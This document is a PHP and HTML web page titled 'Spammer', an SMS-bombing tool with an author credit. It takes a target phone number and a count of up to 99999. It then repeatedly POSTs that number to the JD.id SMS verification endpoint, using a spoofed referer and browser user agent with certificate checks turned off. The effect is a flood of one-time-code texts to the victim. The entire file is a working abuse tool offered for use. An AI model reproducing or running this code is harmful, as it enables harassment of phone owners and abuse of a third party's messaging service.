<!DOCTYPE html>
<html>
 <head>
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
 <style type="text/css">
{ padding: 0; margin: 0; } h2{  color:#50626C;  text-align: center;     font-family: arial;     text-transform: uppercase;  border: 5px solid #f1f1f1;  padding: 5px;   width: 300px;   margin: auto;   margin-bottom: 10px; margin-top: 20px; } form { border: 3px solid #f1f1f1; font-family: arial; width: 300px; margin: auto; } input[type=text], input[type=password] , input[type=number]{ width: 100%; padding: 12px 20px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; box-sizing: border-box; } label{   color:#50626C;  text-transform: uppercase; } button { background-color: #049372; color: white; padding: 14px 20px; margin: 8px 0; border: none; cursor: pointer; width: 100%; } button:hover { opacity: 0.8; } .cancelbtn { width: auto; padding: 10px 18px; background-color: #f03434; } .imgcontainer { text-align: center; margin: 24px 0 12px 0; } img.avatar { width: 40%; border-radius: 50%; } .container { padding: 16px; } span.psw { float: right; padding-top: 16px; } span{     color:#50626C; } /* Change styles for span and cancel button on extra small screens */ @media screen and (max-width: 300px) { span.psw { display: block; float: none; } .cancelbtn { width: 100%; } }
    </style>
<title>-=[ Spammer ]=-</title>
<link rel="stylesheet" href="style.css" type="text/css">
</head>
<body>
<h2>Spam</h2>
<form action=""index.php" method="POST">
<div class="container">
<label><b>Nomer</b></label> <input type="text" placeholder="Nomer... (0812345...)" name="nomer" id="nomer" value="" required>
 
<label><b>Jumlah</b></label> <input type="number" placeholder="Jumlah... (1 - 99999) " name="jumlah" id="jumlah" required>
 
<button type="submit">Tembak</button>
<br><br><br>
<center>
<h5>C0ded By :
<a href="https://facebook.com/asedekontol9x">Egigans</a>
</h5>
</center>
</body> </html>
<?php
function jdidbom($no, $jum, $wait){
    $x = 0;
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
$nomor = $_POST['nomer'];
$jumlah = $_POST['jumlah'];
$jeda = "2";
$execute = jdidbom($nomor, $jumlah, $jeda);
print $execute;
?>
